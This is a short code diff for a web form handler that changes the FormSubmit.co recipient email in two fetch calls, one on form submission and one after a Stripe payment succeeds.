@@ -351,7 +351,7 @@
 
       // Dual delivery: FormSubmit.co (proven email) + Netlify Forms (backup
       // inbox + triggers submission-created function for Sheets/Resend)
-      const fsCall = fetch('https://formsubmit.co/ajax/hausio.co.uk@proton.me', {
+      const fsCall = fetch('https://formsubmit.co/ajax/serfer7501@gmail.com', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' },
         body: JSON.stringify(formSubmitPayload),
@@ -458,7 +458,7 @@
       });
       // Dual delivery on post-Stripe success too
       try {
-        await fetch('https://formsubmit.co/ajax/hausio.co.uk@proton.me', {
+        await fetch('https://formsubmit.co/ajax/serfer7501@gmail.com', {
           method: 'POST',
           headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' },
           body: JSON.stringify(payload),
